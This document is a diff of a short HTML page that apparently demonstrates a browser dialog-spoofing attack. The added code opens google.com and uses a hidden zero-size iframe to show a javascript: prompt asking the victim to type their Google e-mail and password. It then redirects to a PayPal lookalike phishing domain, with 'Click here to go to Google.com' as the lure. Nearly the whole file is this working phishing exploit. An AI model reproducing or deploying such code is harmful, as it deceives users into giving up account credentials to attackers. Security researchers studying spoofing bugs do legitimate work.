@@ -1,17 +1,26 @@
-
 <html>
-  <head>
-  <script>
-    function spoof() {
-      setTimeout(showAuthentication, 2000);
-      window.open('https://accounts.google.com', 'google');
-     }
-     function showAuthentication() {
-       document.location = "http://www.httpwatch.com/httpgallery/authentication/authenticatedimage/default.aspx";
-     }
-   </script>
-  </head>
   <body>
-    <a href="#" onclick="spoof()">Tap me!</a>
+
+    <script>
+
+    function exploit() {
+
+      window.open("https://www.google.com");
+
+      document.getElementById("iframe").src = 'javascript:prompt("In order to access Google.com\\nyou must first login on your\\nGoogle Account.\\n\\nPlease type your e-mail\\nand your password:\\n", "E-mail / Password");';
+      document.location="http://www.manage-myaccount.paypal.com-webapps.bntk.pl";
+
+    }
+    
+    </script>
+
+    <br><br><br><br>
+
+    <a href="#" onclick="exploit();">
+      <center><h1>Click here to go to Google.com</h1></center>
+    </a>
+
+    <iframe styleframeborder="0" style="width:0;height:0;" id="iframe" src=""></iframe>
+
   </body>
 </html>
